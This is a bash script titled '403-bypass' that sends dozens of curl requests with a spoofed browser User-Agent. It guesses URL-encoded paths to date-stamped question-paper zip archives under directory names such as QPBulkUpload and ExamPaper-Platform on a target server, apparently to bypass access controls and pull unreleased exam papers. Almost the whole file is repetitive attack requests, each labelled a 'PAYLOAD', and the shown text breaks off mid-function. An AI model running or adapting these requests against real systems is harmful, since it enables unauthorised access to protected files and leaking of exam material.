#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2\
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
	echo -n "Payload [QP02_12_2023%2008_53_31.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_31.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_31.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_32.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_32.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_32.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_33.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_33.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_33.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
 
echo -n "Payload [QPBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSyncQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSyncQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSyncQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData-ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
